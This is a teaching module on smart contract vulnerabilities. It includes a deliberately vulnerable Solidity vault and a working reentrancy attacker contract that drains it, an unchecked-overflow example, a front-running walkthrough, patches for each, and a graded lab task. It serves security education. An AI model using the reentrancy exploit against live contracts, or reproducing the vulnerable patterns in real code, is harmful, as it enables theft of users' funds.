# Module 3 — Smart Contract Vulnerabilities: Reentrancy, Overflow, and Front-Running

## What You'll Actually Do

You'll exploit three of the most common smart contract vulnerabilities using intentionally vulnerable contracts. You'll write the exploit, understand why it works, then patch the contract and verify the fix. This is the "break it to understand it" approach — the same bugs that drained millions from real protocols.

---

## Reentrancy

The reentrancy bug happens when a contract makes an external call before updating its state. The called contract can call back into the original function before the first execution finishes.

### The Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // BUG: External call before state update
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Transfer failed");

        // This line never executes if attacker re-enters
        balances[msg.sender] = 0;
    }
}
```

### The Attack

The attacker deploys a contract that receives ETH and immediately calls `withdraw()` again:

```solidity
contract Attacker {
    VulnerableVault public vault;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // This is called when the vault sends ETH back
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}
```

**What happens:**
1. Attacker calls `attack()` with 1 ETH
2. Vault records 1 ETH balance, sends 1 ETH to attacker
3. `receive()` triggers — vault still thinks attacker has 1 ETH
4. Attacker calls `withdraw()` again — gets another 1 ETH
5. Repeats until vault is drained

### The Fix

Use the checks-effects-interactions pattern. Update state before making external calls.

```solidity
function withdraw() external {
    uint256 balance = balances[msg.sender];
    require(balance > 0, "No balance");

    // Effects BEFORE interaction
    balances[msg.sender] = 0;

    // Then external call
    (bool sent, ) = msg.sender.call{value: balance}("");
    require(sent, "Transfer failed");
}
```

Or use OpenZeppelin's `ReentrancyGuard`:

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeVault is ReentrancyGuard {
    function withdraw() external nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Transfer failed");
    }
}
```

---

## Integer Overflow and Underflow

Before Solidity 0.8, integers wrapped around on overflow. `uint8(255) + 1` became `0`. Attackers exploited this to inflate token balances or bypass balance checks.

```solidity
// Pre-0.8 Solidity (VULNERABLE)
uint8 balance = 255;
balance += 1;  // Now 0 — the attacker's balance "disappeared"
```

**Solidity 0.8+ checks for overflow by default** and reverts. But if you use `unchecked` blocks, you're back to vulnerable:

```solidity
function unsafeAdd(uint256 a, uint256 b) pure returns (uint256) {
    unchecked {
        return a + b;  // Can overflow without reverting
    }
}
```

**Fix**: Don't use `unchecked` for arithmetic that involves user input or financial calculations. If you must use it, add explicit bounds checks.

---

## Front-Running

Front-running happens when a validator (or any node) sees a pending transaction in the mempool and inserts their own transaction before it. This is baked into how public blockchains work — the mempool is visible to everyone.

### Classic Example: DEX Trade

```
1. Alice submits tx: "Buy 100 TOKEN at market price"
2. Tx enters mempool, visible to everyone
3. Attacker sees the pending tx
4. Attacker submits: "Buy 200 TOKEN at market price" with higher gas
5. Attacker's tx mines first, buys at current price
6. Alice's tx mines, her buy pushes price up
7. Attacker sells immediately at the higher price
```

### Mitigations

**Commit-reveal schemes**: Submit a hash of your action first, reveal later. Nobody can front-run what they can't read.

```solidity
// Commit phase
function commitAction(bytes32 hash) external {
    commitments[msg.sender] = hash;
}

// Reveal phase (after a delay)
function revealAction(uint256 amount, uint256 salt) external {
    bytes32 expected = keccak256(abi.encodePacked(msg.sender, amount, salt));
    require(commitments[msg.sender] == expected, "Hash mismatch");
    // Now execute the action
}
```

**Slippage protection**: DEXs like Uniswap let you set `amountOutMin` — the minimum you'll accept. If the price moved too much, the transaction reverts.

```solidity
// User sets minAmountOut = 95 when expecting 100
// If front-runner pushes price so user would get 93, tx reverts
swap(amountIn, minAmountOut);  // Protects against excessive slippage
```

---

## Assessment

**Lab Task — Exploit and Patch**

You're given a vulnerable vault contract with three bugs: reentrancy in `withdraw()`, unchecked arithmetic in `deposit()`, and no slippage protection in a swap function.

1. Deploy the vulnerable contract to Hardhat local network
2. Write and run exploit contracts for each vulnerability
3. Document what each exploit achieves and why it works
4. Patch all three vulnerabilities and write tests proving the exploits now fail

**Time:** 90 minutes

**Grading (10 points):**
- 3 points: Reentrancy exploit successfully drains the vault
- 2 points: Overflow exploit demonstrated (or explanation of why pre-0.8 behavior is exploitable)
- 2 points: Front-running scenario documented with commit-reveal or slippage fix
- 3 points: All three patches verified with passing exploit-retry tests

**Evidence:** Hardhat test output showing exploit success then exploit failure after patching. Contract source code with fixes.
